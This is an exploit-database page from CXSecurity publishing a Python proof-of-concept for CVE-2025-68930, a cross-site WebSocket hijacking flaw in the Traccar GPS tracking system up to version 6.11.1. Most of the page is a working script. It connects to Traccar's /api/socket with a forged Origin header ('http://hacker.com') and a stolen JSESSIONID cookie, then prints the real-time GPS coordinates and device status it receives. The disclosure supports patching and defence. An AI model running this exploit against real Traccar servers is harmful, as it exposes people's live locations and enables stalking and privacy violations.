---
title: Traccar GPS Tracking System 6.11.1 Cross-Site WebSocket Hijacking (CSWSH)
url: https://cxsecurity.com/issue/WLB-2026050005
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-13
fetch_date: 2026-05-14T05:45:31.958732
---

# Traccar GPS Tracking System 6.11.1 Cross-Site WebSocket Hijacking (CSWSH)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Traccar GPS Tracking System 6.11.1 Cross-Site WebSocket Hijacking (CSWSH)** **2026.05.13**  Credit:  **[Hazar Taspinar](https://cxsecurity.com/author/Hazar%2BTaspinar/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-68930](https://cxsecurity.com/cveshow/CVE-2025-68930/ "Click to see CVE-2025-68930")**  CWE: **N/A** | |

# Exploit Title: Traccar GPS Tracking System 6.11.1 - Cross-Site WebSocket Hijacking (CSWSH)
# Date: 2026-02-26
# Exploit Author: Hazar Taspinar
# Vendor Homepage: https://www.traccar.org/
# Software Link: https://github.com/traccar/traccar
# Version: <= 6.11.1
# Tested on: Windows 11 / Linux
# CVE: CVE-2025-68930
"""
Description:
Traccar fails to validate the 'Origin' header in WebSocket connections (/api/socket).
An attacker can bypass the Same Origin Policy (SOP) by supplying a malicious Origin header
along with a victim's valid JSESSIONID. This allows the attacker to hijack the
WebSocket connection and leak real-time sensitive data, including GPS coordinates
and device status.
Requirements:
pip install websocket-client
"""
import websocket
import argparse
import sys
def on\_message(ws, message):
print(f"[+] DATA LEAKED: {message}")
def on\_error(ws, error):
print(f"[-] Error: {error}")
def on\_close(ws, close\_status\_code, close\_msg):
print("[-] Connection closed.")
def on\_open(ws):
print("[\*] WebSocket Handshake Successful!")
print("[\*] Connection upgraded. Streaming real-time sensitive data...\n")
def main():
parser = argparse.ArgumentParser(description="Traccar CSWSH Exploit - Information Disclosure")
parser.add\_argument("--target", required=True, help="Target IP address (e.g., 192.168.1.5)")
parser.add\_argument("--port", default="8082", help="Target Port (default: 8082)")
parser.add\_argument("--cookie", required=True, help="Valid JSESSIONID (e.g., node0xxxxxxx)")
args = parser.parse\_args()
# Construct the WebSocket URL
url = f"ws://{args.target}:{args.port}/api/socket"
# Malicious headers triggering the bypass
# The 'Origin' header is set to an external domain to demonstrate lack of validation.
headers = [
"Origin: http://hacker.com",
f"Cookie: JSESSIONID={args.cookie}"
]
print(f"""
================================================
TRACCAR GPS TRACKER - CSWSH EXPLOIT
Exploit Author: Hazar Taspinar
CVE: CVE-2025-68930
Target: {url}
================================================
""")
# Initiate WebSocket connection
ws = websocket.WebSocketApp(url,
on\_message=on\_message,
on\_error=on\_error,
on\_close=on\_close,
on\_open=on\_open,
header=headers)
try:
ws.run\_forever()
except KeyboardInterrupt:
print("\n[\*] Exploit stopped by user.")
sys.exit(0)
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026050005)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top